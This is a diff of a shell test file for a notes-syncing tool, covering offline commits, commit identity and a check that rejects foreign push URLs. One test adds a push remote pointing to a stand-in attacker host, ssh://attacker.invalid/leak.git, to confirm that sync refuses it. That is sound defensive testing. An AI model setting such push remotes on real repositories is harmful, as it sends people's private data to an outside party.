@@ -2,15 +2,15 @@
 # AC-3 - regression: offline work was never committed on the prototype,
 # so there was no restore point.
 load 'helpers'
-setup() { brain_test_setup; make_fake_personal_repo; }
+setup() { brain_test_setup; make_fake_team_repo; }
 teardown() { brain_test_teardown; }
 
 @test "a full cycle with the network unavailable still commits locally, before ever reaching the network" {
   make_local_ahead_change
   run_sync_cycle
-  run git -C "$PERSONAL" log -1 --pretty=%s
+  run git -C "$TEAM" log -1 --pretty=%s
   [[ "$output" == notes\ * ]]
-  [ "$(git -C "$PERSONAL" rev-list --count origin/main..HEAD)" -eq 1 ]
+  [ "$(git -C "$TEAM" rev-list --count origin/main..HEAD)" -eq 1 ]
   grep -q "offline; local work is committed" "$LOG"
 }
 
@@ -36,15 +36,15 @@ teardown() { brain_test_teardown; }
   # the expected value is written out, not read from the engine's own variable: comparing two
   # things the engine computes would pass even when both are wrong. helpers.bash seeds
   # $STATE/person with "testperson", exactly as setup.sh does on a real Mac.
-  [ "$(git -C "$PERSONAL" log -1 --format=%an)" = "Serlino Brain (testperson)" ]
-  [[ "$(git -C "$PERSONAL" log -1 --format=%ae)" == brain-testperson@* ]]
-  [ "$(git -C "$PERSONAL" log -1 --format=%cn)" = "Serlino Brain (testperson)" ]
-  [[ "$(git -C "$PERSONAL" log -1 --format=%ce)" == brain-testperson@* ]]
+  [ "$(git -C "$TEAM" log -1 --format=%an)" = "Serlino Brain (testperson)" ]
+  [[ "$(git -C "$TEAM" log -1 --format=%ae)" == brain-testperson@* ]]
+  [ "$(git -C "$TEAM" log -1 --format=%cn)" = "Serlino Brain (testperson)" ]
+  [[ "$(git -C "$TEAM" log -1 --format=%ce)" == brain-testperson@* ]]
 }
 
 @test "a foreign push URL is refused before personal notes are pushed" {
-  git -C "$PERSONAL" remote set-url --add --push origin ssh://attacker.invalid/leak.git
-  run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_personal"
+  git -C "$TEAM" remote set-url --add --push origin ssh://attacker.invalid/leak.git
+  run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_team"
   [ "$status" -ne 0 ]
   grep -q "push URL does not match fetch URL" "$LOG"
 }
